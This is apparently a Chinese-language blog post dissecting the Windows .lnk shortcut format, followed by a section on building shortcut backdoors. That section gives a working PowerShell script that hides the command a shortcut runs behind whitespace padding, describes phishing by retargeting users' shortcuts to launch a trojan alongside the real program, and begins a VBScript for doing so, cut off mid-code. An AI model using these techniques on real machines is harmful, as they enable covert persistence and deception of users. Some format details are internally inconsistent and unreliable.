+<td align="left">The file or directory is compressed. For a file, this means that all data in the file is compressed. For a directory, this means that compression is the default for newly created files and subdirectories.</td>
+</tr>
+<tr>
+<td align="left">M<br>FILE_ATTRIBUTE_OFFLINE</td>
+<td align="left">The data of the file is not immediately available.</td>
+</tr>
+<tr>
+<td align="left">N<br>FILE_ATTRIBUTE_NOT_CONTENT_INDEXED</td>
+<td align="left">The contents of the file need to be indexed.</td>
+</tr>
+<tr>
+<td align="left">O<br>FILE_ATTRIBUTE_ENCRYPTED</td>
+<td align="left">The file or directory is encrypted. For a file, this means that all data in the file is encrypted. For a directory, this means that encryption is the default for newly created files and subdirectories.</td>
+</tr>
+</tbody></table>
+<h5><span id="3121-calcexe-快捷键-shelllinkheader-fileattributes-包含项">3.1.2.1 Calc.exe 快捷键 ShellLinkHeader FileAttributes 包含项</span></h5><p><img src="/images/image-20240510105653234.png" alt="image-20240510105653234"></p>
+<p>由上可以看到，该文件LinkFlags为0x000802DB(Bin：0000 0000 0000 0000 0000 0000 0010 0000)，这表示以下Flag被设置：</p>
+<ul>
+<li>FILE_ATTRIBUTE_ARCHIVE</li>
+</ul>
+<h4><span id="313-showcommand">3.1.3 ShowCommand</span></h4><p>​	（具体 Flag 标志相关信息请查看参考文献 [9] ）</p>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">SW_SHOWNORMAL0x00000001</td>
+<td align="left">The application is open and its window is open in a normal fashion.<br>应用程序已打开并且其窗口以正常方式打开。</td>
+</tr>
+<tr>
+<td align="left">SW_SHOWMAXIMIZED<br>0x00000003</td>
+<td align="left">The application is open, and keyboard focus is given to the application, but its window is not shown.<br>应用程序已打开，并且键盘焦点已分配给应用程序，但未显示其窗口。</td>
+</tr>
+<tr>
+<td align="left">SW_SHOWMINNOACTIVE<br>0x00000007</td>
+<td align="left">The application is open, but its window is not shown. It is not given the keyboard focus.<br>应用程序已打开，但未显示其窗口。没有给予键盘焦点。</td>
+</tr>
+</tbody></table>
+<p><strong>注意6： 所有其他值必须被视为 <code>SW_SHOWNORMAL</code></strong></p>
+<h4><span id="313-hotkeyflags">3.1.3 HotKeyFlags</span></h4><p>​	（具体 Flag 标志相关信息请查看参考文献 [10] ）</p>
+<p><img src="/images/image-20240510124659009.png" alt="image-20240510124659009"></p>
+<h3><span id="32-linktargetidlist">3.2 LinkTargetIDList</span></h3><p>​	LinkFlags 中<code>HasLinkTargetIDList</code>设为1，故文件包含LinkTargetIDList结构</p>
+<p><img src="/images/image-20240510130227553.png" alt="image-20240510130227553"></p>
+<p>​	LinkTargetIDList 是由以下两部分组成：</p>
+<ul>
+<li>IDListSize(2 字节)：IDList字段的大小（以字节为单位）</li>
+<li>IDList：一个存储的IDList结构，其中包含项目ID列表</li>
+</ul>
+<p><img src="/images/image-20240510131501945.png" alt="image-20240510131501945"></p>
+<h4><span id="321-idlist">3.2.1 IDList</span></h4><p>​	IDList 是由以下两部分组成:</p>
+<ul>
+<li>ItemIDList：零个或多个ItemID结构的数组</li>
+<li>TerminalID(2 字节)：一个 16 位无符号整数，指示项目 ID 的结尾。该值必须为0</li>
+</ul>
+<p><img src="/images/image-20240510131058846.png" alt="image-20240510131058846"></p>
+<p><img src="/images/image-20240510131543465.png" alt="image-20240510131543465"></p>
+<h5><span id="3211-itemid">3.2.1.1 ItemID</span></h5><p>​	ItemID是由以下两部分组成:</p>
+<ul>
+<li>ItemIDSize(2 字节)：一个 16 位无符号整数，指定 ItemID 结构的大小（以字节为单位），包括ItemIDSize字段</li>
+<li>data：指定项目的 shell 数据源定义的数据</li>
+</ul>
+<p><img src="/images/image-20240510131326602.png" alt="image-20240510131326602"></p>
+<p><img src="/images/image-20240510131558819.png" alt="image-20240510131558819"></p>
+<h3><span id="33-linkinfo">3.3 LinkInfo</span></h3><p><img src="/images/image-20240510131758200.png" alt="image-20240510131758200"></p>
+<p><img src="/images/image-20240510131816900.png" alt="image-20240510131816900"></p>
+<p><img src="/images/image-20240510131949174.png" alt="image-20240510131949174"></p>
+<ul>
+<li><p>LinkInfoSize(4 bytes)：一个 32 位无符号整数，指定 LinkInfo 结构的大小（以字节为单位）。<strong>该结构中指定的所有偏移量必须小于该值，并且该结构中包含的所有字符串必须适合该大小定义的范围</strong></p>
+</li>
+<li><p>LinkInfoHeaderSize(4 bytes)：一个 32 位无符号整数，指定LinkInfo标头部分的大小（以字节为单位），该标头部分由LinkInfoSize、LinkInfoHeaderSize、 LinkInfoFlags、VolumeIDOffset、LocalBasePathOffset、CommonNetworkRelativeLinkOffset、 CommonPathSuffixOffset字段 组成</p>
+</li>
+<li><p>LinkInfoFlags(4 bytes)：指定此结构中是否存在 VolumeID、LocalBasePath、LocalBasePathUnicode和 CommonNetworkRelativeLink 字段的标志</p>
+</li>
+<li><p>VolumeIDOffset(4 bytes)： 32 位无符号整数，指定VolumeID字段的位置。如果设置VolumeIDAndLocalBasePath 标志，则该值是距 LinkInfo 结构开头的偏移量(以字节为单位)；否则，该值必须为零</p>
+</li>
+<li><p>LocalBasePathOffset(4 bytes)：一个 32 位无符号整数，指定LocalBasePath字段的位置。如果设置了VolumeIDAndLocalBasePath标志，则该值是距 LinkInfo 结构开头的偏移量（以字节为单位）；否则，该值必须为零</p>
+</li>
+<li><p>CommonNetworkRelativeLinkOffset(4 bytes)： 32 位无符号整数，指定CommonNetworkRelativeLink字段的位置 。如果设置了CommonNetworkRelativeLinkAndPathSuffix标志，则该值是距 LinkInfo 结构开头的偏移量（以字节为单位）；否则，该值必须为零</p>
+</li>
+<li><p>CommonPathSuffixOffset(4 bytes)：一个 32 位无符号整数，指定CommonPathSuffix字段的位置 。该值是距 LinkInfo 结构开头的偏移量（以字节为单位）</p>
+</li>
+<li><p>LocalBasePathOffsetUnicode(4 bytes)：可选的 32 位无符号整数，指定LocalBasePathUnicode字段的位置 。如果设置了VolumeIDAndLocalBasePath标志，则该值是距 LinkInfo 结构开头的偏移量(以字节为单位)；否则，该值必须为零。仅当LinkInfoHeaderSize字段的值 大于或等于 0x00000024 时，才能出现此字段</p>
+</li>
+<li><p>CommonPathSuffixOffsetUnicode(4 bytes)：可选的 32 位无符号整数，指定CommonPathSuffixUnicode字段的位置 。该值是距 LinkInfo 结构开头的偏移量（以字节为单位）。仅当LinkInfoHeaderSize字段的值 大于或等于 0x00000024 时，才能出现此字段</p>
+<p>VolumeID：可选的VolumeID结构（第 2.3.1 节），指定创建链接时链接目标所在卷的信息。如果 设置了VolumeIDAndLocalBasePath标志，则存在此字段。</p>
+</li>
+<li><p>LocalBasePath：一个可选的、以 NULL 结尾的字符串，由系统默认代码页定义，用于通过将字符串附加到 CommonPathSuffix 字段来构造链接项或链接目标的完整路径。如果 设置了VolumeIDAndLocalBasePath标志，则存在此字段</p>
+</li>
+<li><p>CommonNetworkRelativeLink：可选的 CommonNetworkRelativeLink 结构（第 2.3.2 节），指定有关存储链接目标的网络位置的信息</p>
+</li>
+<li><p>CommonPathSuffix：一个以 NULL 结尾的字符串，由系统默认代码页定义，用于通过附加到LocalBasePath字段中的字符串来构造链接项或链接目标的完整路径</p>
+</li>
+<li><p>LocalBasePathUnicode：一个可选的、以 NULL 结尾的Unicode 字符串，用于通过将字符串附加到CommonPathSuffixUnicode字段中来构造链接项或链接目标的完整路径。仅当设置了VolumeIDAndLocalBasePath标志并且LinkInfoHeaderSize字段的值大于或等于 0x00000024 时，此字段才可以存在</p>
+</li>
+<li><p>CommonPathSuffixUnicode：一个可选的、以 NULL 结尾的 Unicode 字符串，用于通过附加到LocalBasePathUnicode 字段中的字符串来构造链接项或链接目标的完整路径。仅当LinkInfoHeaderSize字段的值 大于或等于 0x00000024 时，才能出现此字段</p>
+</li>
+</ul>
+<h4><span id="331-linkinfoheadersize">3.3.1 LinkInfoHeaderSize</span></h4><table>
+<thead>
+<tr>
+<th align="left">value</th>
+<th align="left">Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x0000001C</td>
+<td align="left">未指定可选字段的偏移量。</td>
+</tr>
+<tr>
+<td align="left">0x00000024 ≤<em>value</em></td>
+<td align="left">指定可选字段的偏移量。</td>
+</tr>
+</tbody></table>
+<h4><span id="332-linkinfoflags">3.3.2 LinkInfoFlags</span></h4><p><img src="/images/image-20240510132337592.png" alt="image-20240510132337592"></p>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">A<br>VolumeIDAndLocalBasePath</td>
+<td align="left">If set, the <strong>VolumeID</strong> and <strong>LocalBasePath</strong> fields are present, and their locations are specified by the values of the <strong>VolumeIDOffset</strong> and <strong>LocalBasePathOffset</strong> fields, respectively. If the value of the <strong>LinkInfoHeaderSize</strong> field is greater than or equal to 0x00000024, the <strong>LocalBasePathUnicode</strong> field is present, and its location is specified by the value of the <strong>LocalBasePathOffsetUnicode</strong> field.If not set, the <strong>VolumeID</strong>, <strong>LocalBasePath</strong>, and <strong>LocalBasePathUnicode</strong> fields are not present, and the values of the <strong>VolumeIDOffset</strong> and <strong>LocalBasePathOffset</strong> fields are zero. If the value of the <strong>LinkInfoHeaderSize</strong> field is greater than or equal to 0x00000024, the value of the <strong>LocalBasePathOffsetUnicode</strong> field is zero.<br></td>
+</tr>
+<tr>
+<td align="left">B<br>CommonNetworkRelativeLinkAndPathSuffix</td>
+<td align="left">If set, the <strong>CommonNetworkRelativeLink</strong> field is present, and its location is specified by the value of the <strong>CommonNetworkRelativeLinkOffset</strong> field.If not set, the <strong>CommonNetworkRelativeLink</strong> field is not present, and the value of the <strong>CommonNetworkRelativeLinkOffset</strong> field is zero.<br></td>
+</tr>
+</tbody></table>
+<h4><span id="333-volumeid">3.3.3 VolumeID</span></h4><p>​	VolumeID 结构指定有关创建链接 时链接目标所在卷的信息。如果在原始位置找不到该文件，此信息对于解析链接很有用</p>
+<p><img src="/images/image-20240510133732319.png" alt="image-20240510133732319"></p>
+<p>VolumeID是由以下部分组成:</p>
+<ul>
+<li><p>VolumeIDSize(4 bytes)：一个 32 位无符号整数，指定此结构的大小（以字节为单位）。该值必须大于 0x00000010。该结构中指定的所有偏移量必须小于该值，并且该结构中包含的所有字符串必须适合该大小定义的范围</p>
+</li>
+<li><p>DriveType(4 bytes)：一个 32 位无符号整数，指定存储链接目标的驱动器类型</p>
+</li>
+<li><p>DriveSerialNumber(4 bytes)：一个 32 位无符号整数，指定存储链接目标的卷的驱动器序列号</p>
+</li>
+<li><p>VolumeLabelOffset(4 bytes)：一个 32 位无符号整数，指定包含存储链接目标的驱动器的卷标的字符串的位置。该值是从 VolumeID 结构的开头到 NULL 终止字符串的偏移量（以字节为单位），由系统默认代码页定义。卷标字符串位于该结构的数据字段中</p>
+<p>​	如果该字段的值为 0x00000014，则必须忽略它，并且必须使用VolumeLabelOffsetUnicode字段的值来定位卷标字符串。</p>
+</li>
+<li><p>VolumeLabelOffsetUnicode(4 bytes)：可选的 32 位无符号整数，指定包含存储链接目标的驱动器的卷标的字符串的位置。该值是从 VolumeID 结构的开头到 NULL 终止的Unicode 字符字符串的偏移量（以字节为单位）。卷标字符串位于该结构的数据字段中</p>
+<p>​	如果VolumeLabelOffset字段的值不是 0x00000014，则该字段不得存在；相反， VolumeLabelOffset字段的值 必须用于定位卷标字符串</p>
+</li>
+<li><p>data：数据缓冲区，其中包含驱动器的卷标，作为由系统默认代码页或 Unicode 字符定义的字符串，如前面的字段所指定</p>
+</li>
+</ul>
+<h5><span id="3331-drivetype">3.3.3.1 DriveType</span></h5><table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DRIVE_UNKNOWN0x00000000</td>
+<td align="left">The drive type cannot be determined.</td>
+</tr>
+<tr>
+<td align="left">DRIVE_NO_ROOT_DIR0x00000001</td>
+<td align="left">The root path is invalid; for example, there is no volume mounted at the path.</td>
+</tr>
+<tr>
+<td align="left">DRIVE_REMOVABLE0x00000002</td>
+<td align="left">The drive has removable media, such as a floppy drive, thumb drive, or flash card reader.</td>
+</tr>
+<tr>
+<td align="left">DRIVE_FIXED0x00000003</td>
+<td align="left">The drive has fixed media, such as a hard drive or flash drive.</td>
+</tr>
+<tr>
+<td align="left">DRIVE_REMOTE0x00000004</td>
+<td align="left">The drive is a remote (network) drive.</td>
+</tr>
+<tr>
+<td align="left">DRIVE_CDROM0x00000005</td>
+<td align="left">The drive is a CD-ROM drive.</td>
+</tr>
+<tr>
+<td align="left">DRIVE_RAMDISK0x00000006</td>
+<td align="left">The drive is a RAM disk.</td>
+</tr>
+</tbody></table>
+<h3><span id="34-stringdata">3.4 StringData</span></h3><p>​	StringData 是指传达用户界面和路径标识信息的一组结构</p>
+<h4><span id="341-stringdata-类型">3.4.1 StringData 类型</span></h4><p>​	StringData 大致分为以下几个类型：</p>
+<ul>
+<li>NAME_STRING ：一个可选结构，指定显示给最终用户的快捷方式的描述，以识别shell 链接 的用途。如果设置了HasName标志，则该结构必须存在</li>
+<li>RELATIVE_PATH ：一个可选结构，指定链接目标相对于包含 shell 链接的文件的位置。指定后，解析链接时应该使用该字符串。如果设置了HasRelativePath标志，则该结构必须存在</li>
+<li>WORKING_DIR：一个可选结构，指定激活链接目标时要使用的工作目录的文件系统路径。如果设置了HasWorkingDir标志，则该结构必须存在</li>
+<li>COMMAND_LINE_ARGUMENTS：一个可选结构，用于存储激活链接目标时指定的命令行参数。如果设置了HasArguments标志，则该结构必须存在</li>
+<li>ICON_LOCATION：一个可选结构，指定在图标视图中显示 shell 链接项时要使用的图标的位置。如果设置了HasIconLocation标志，则该结构必须存在</li>
+</ul>
+<p><img src="/images/image-20240510134552027.png" alt="image-20240510134552027"></p>
+<h4><span id="342-string-data-结构">3.4.2 String Data 结构</span></h4><p>​	每个String Data结构如下：</p>
+<p><img src="/images/image-20240510134748355.png" alt="image-20240510134748355"></p>
+<ul>
+<li>CountCharacters(2  bytes)：一个 16 位无符号整数，指定由系统默认代码页定义的字符数或在字符串字段中找到的Unicode字符数。零值指定空字符串。</li>
+<li>String：由系统默认代码页定义的可选字符集，或长度由CountCharacters字段指定的 Unicode 字符串。该字符串不得以 NULL 结尾。</li>
+</ul>
+<p>​	上图中CountCharacters为0x22，说明总共存在0x22*2&#x3D;0x44个字节的数据</p>
+<h3><span id="35-sextradata">3.5 sExtraData</span></h3><p>​	ExtraData 是指传达有关链接目标的附加信息的一组结构。这些可选结构可以出现在附加到基本 Shell 链接二进制文件格式的额外数据部分中</p>
+<p><img src="/images/image-20240510135333214.png" alt="image-20240510135333214"></p>
+<p>​	这里便不再详细展开了，要看具体信息，请参考微软官方文档</p>
+<h3><span id="36-辅助工具推荐">3.6 辅助工具推荐</span></h3><p>​	<a target="_blank" rel="noopener" href="https://ericzimmerman.github.io/#!index.md">https://ericzimmerman.github.io/#!index.md</a></p>
+<blockquote>
+<p>LECmd.exe -f [:link file name]</p>
+</blockquote>
+<p><img src="/images/image-20240510150427481.png" alt="image-20240510150427481"></p>
+<h2><span id="4-lnk-与-link-的区别">4. Lnk 与 link 的区别</span></h2><p>​	在 Windows 中，使用 <code>mklink</code> 创建的软链接（符号链接）与快捷方式（.lnk 文件）是不同的。<code>mklink</code> 创建的是一个指向文件或目录的系统级符号链接，而快捷方式是通过 Windows Shell 创建的，包含更多元数据的链接。</p>
+<h3><span id="41-快捷方式lnk-文件">4.1 快捷方式（.lnk 文件）</span></h3><ul>
+<li>创建：通过 Windows 资源管理器或程序右键菜单创建</li>
+<li>特性：实际上是一个小的桌面入口对象（DEO），它包含目标文件或目录的位置信息</li>
+<li>存储：作为文件存储在文件系统中，可以移动到其他计算机</li>
+<li>跨文件系统：可以跨不同的文件系统和卷</li>
+<li>显示：通常在资源管理器中以不同图标显示，并带有一个小箭头标志</li>
+</ul>
+<h3><span id="42-软链接符号链接symlink">4.2 软链接（符号链接，symlink）</span></h3><ul>
+<li>创建：使用命令行工具（如 <code>mklink</code>）创建</li>
+<li>特性：是一个轻量级的文件系统对象，它包含目标路径的文本表示</li>
+<li>存储：不包含数据，只包含一个指向另一个文件或目录的路径</li>
+<li>跨文件系统：可以跨不同的文件系统和卷（Windows 允许创建指向不同驱动器的符号链接）</li>
+<li>显示：在资源管理器中通常以普通文件或文件夹的形式显示，没有特殊标记</li>
+</ul>
+<h3><span id="43-硬链接hard-link">4.3 硬链接（hard link）</span></h3><ul>
+<li>创建：使用命令行工具（如 <code>fsutil</code> 或 <code>link</code>）创建</li>
+<li>特性：是一个指向文件数据的直接引用，与原始文件共享数据块</li>
+<li>存储：硬链接直接指向文件的数据，不是独立的文件</li>
+<li>跨文件系统：不能跨不同的文件系统或卷，必须在同一个卷上</li>
+<li>显示：在资源管理器中以普通文件或文件夹的形式显示，没有特殊标记</li>
+</ul>
+<h1><span id="第三部分-windows-快捷方式后门">第三部分 windows 快捷方式后门</span></h1><h2><span id="0-windows快捷方式后门利用方式">0. windows快捷方式后门利用方式</span></h2><ul>
+<li>为恶意进程创建快捷方式，并将其加入启动程序</li>
+<li>钓鱼，利用当前用户现有的快捷方式进行迷惑，达到既能开启原程序，又能执行恶意程序的效果</li>
+</ul>
+<h2><span id="1-快捷方式奇淫巧计">1. 快捷方式奇淫巧计</span></h2><h3><span id="11-更改图标">1.1 更改图标</span></h3><h4><span id="111-文件属性-更改图标">1.1.1 文件属性-更改图标</span></h4><p><img src="/images/image-20240510140847822.png" alt="image-20240510140847822"></p>
+<h4><span id="112-文件结构-string-data-icon-location">1.1.2 文件结构-String Data (ICON LOCATION)</span></h4><p><img src="/images/image-20240510145131057.png" alt="image-20240510145131057"></p>
+<p><img src="/images/image-20240510145119318.png" alt="image-20240510145119318"></p>
+<p><strong>注意7：修改完String Data中ICON LOCATION结构体的String和CountCharacters后需要去查看sShellLinkHeader的IconIndex属性是否置为一个正确的数字，正确的数指的是IconIdex必须小于当前lnk指向的程序中所有的icon图集总数</strong></p>
+<p>​	比如存在程序index.exe，他的程序中有三个Icon，那么我们可以将IconIdex分别设置为0、1或者2，那么就可以显示出正确的所指向的Icon，不然将会显示默认的空白文件的Icon</p>
+<p><strong>注意8：通常情况下我们会将IconIndex置为0，因为对于一个程序来说(例如index.exe)，那么<code>index.exe,0</code>就是指向的是当前程序的icon图标</strong></p>
+<h3><span id="12-更改目标">1.2 更改目标</span></h3><h4><span id="121-文件属性-目标">1.2.1 文件属性-目标</span></h4><p><img src="/images/image-20240510145828481.png" alt="image-20240510145828481"></p>
+<h4><span id="122-文件结构-sextdatasenvironmentvariabledatablock">1.2.2 文件结构-sExtData(sEnvironmentVariableDataBlock)</span></h4><p><img src="/images/image-20240510143910525.png" alt="image-20240510143910525"></p>
+<p><strong>注意9：需要同时修改sExtData中sEnvironmentVariableDataBlock结构体的TargetANSI和TargetUnicode</strong></p>
+<h3><span id="13-字符长度欺骗">1.3 字符长度欺骗</span></h3><p>​	对于 Windows 快捷方式，点击右键属性，其中有一个”目标”选项，指向的是我们需要运行的程序的路径。目标的最大长度只有260个字符。任何超过这个长度的东西都是不可见的。但是，命令行参数的最大长度是4096个字符，我们可以在执行的命令行中插入空格，超过目标字段展示的260字符的长度，之后则无法在上面的窗口中看到整个命令。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="built_in">Get-Content</span> <span class="string">&quot;C:\Users\Administrator\Desktop\test.txt&quot;</span></span><br><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;C:\Users\Administrator\Desktop\test.txt.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%/system32/cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%/System32/Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&#x27;                                                                                                                                                                                                                                       &#x27;</span>+ <span class="variable">$file</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20240510151252599.png" alt="image-20240510151252599"></p>
+<p>​	查看新生成的test.exe.lnk，我们可以发现在他的目标处，已经显示空白了</p>
+<p><img src="/images/image-20240510151304116.png" alt="image-20240510151304116"></p>
+<h2><span id="2-创建-windows-快捷方式后门">2. 创建 windows 快捷方式后门</span></h2><h3><span id="21-方法一-通过新建隐藏后门-vbscript-脚本">2.1 方法一： 通过新建隐藏后门 VBScript 脚本</span></h3><p>​	查找特定文件夹下是否存在<code>.lnk</code>文件，然后更改其指向的目标文件，这种方法需要通过创建一个vbs文件来进行完成，这个vbs文件会执行原始文件和我们的木马文件。</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> WshShell = WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span> )</span><br><span class="line"><span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">Const</span> FILE_ATTRIBUTE_NORMAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">Const</span> FILE_ATTRIBUTE_READONLY = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> FILE_ATTRIBUTE_HIDDEN = <span class="number">2</span></span><br><span class="line"><span class="keyword">Const</span> FILE_ATTRIBUTE_SYSTEM = <span class="number">4</span></span><br><span class="line"><span class="keyword">Const</span> FILE_ATTRIBUTE_DIRECTORY = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Const</span> FILENAME_MIN_LENGTH = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> FILENAME_MAX_LENGTH = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Const</span> lnkSuffix = <span class="string">&quot;lnk&quot;</span></span><br><span class="line"><span class="keyword">Const</span> hookScriptSuffix = <span class="string">&quot;vbs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; GetFileSuffixByIndex </span></span><br><span class="line"><span class="comment">&#x27; 根据文件路径和索引，获取对应的后缀</span></span><br><span class="line"><span class="keyword">Function</span> GetFileSuffixByIndex(filePath, suffix_index)</span><br><span class="line">	<span class="keyword">Set</span> file = fso.GetFile(filePath)</span><br><span class="line">	fileName = file.Name</span><br><span class="line">	</span><br><span class="line">	suffix_arr = <span class="built_in">Split</span>(filename, <span class="string">&quot;.&quot;</span>) </span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	</span><br><span class="line">    <span class="keyword">If</span> <span class="built_in">UBound</span>(suffix_arr) &gt;= suffix_index <span class="keyword">Then</span></span><br><span class="line">        result = suffix_arr(<span class="built_in">UBound</span>(suffix_arr) - suffix_index + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">Set</span> file = <span class="literal">Nothing</span></span><br><span class="line">	GetFileSuffixByIndex = result</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; IsFileSuffixExpected </span></span><br><span class="line"><span class="comment">&#x27; 判断文件后缀是否是预期的文件后缀</span></span><br><span class="line"><span class="keyword">Function</span> IsFileSuffixExpected(fileSuffix, expectedSuffix)</span><br><span class="line">	<span class="keyword">If</span> <span class="built_in">LCase</span>(fileSuffix)= <span class="built_in">LCase</span>(expectedSuffix) <span class="keyword">Then</span></span><br><span class="line">		IsFileSuffixExpected = <span class="number">1</span></span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">		IsFileSuffixExpected = <span class="number">0</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; GetRandomBetween</span></span><br><span class="line"><span class="comment">&#x27; 生成一个 [a, b) 区间内的随机数</span></span><br><span class="line"><span class="keyword">Function</span> GetRandomBetween(a, b)</span><br><span class="line">    <span class="keyword">Dim</span> seed</span><br><span class="line">    <span class="keyword">Randomize</span> Timer</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">Dim</span> randomValue</span><br><span class="line">	<span class="comment">&#x27; Rnd 生成一个 [0, 1) 区间内的随机数</span></span><br><span class="line">    randomValue = <span class="built_in">Int</span>(((b - a) * Rnd) + a)</span><br><span class="line">    GetRandomBetween = randomValue</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; GetRandomAlphanumeric</span></span><br><span class="line"><span class="comment">&#x27; 生成一个字符数字集的随机数</span></span><br><span class="line"><span class="keyword">Function</span> GetRandomAlphanumeric()</span><br><span class="line">    <span class="keyword">Dim</span> charSet, randomChar, randomIndex</span><br><span class="line">    charSet = <span 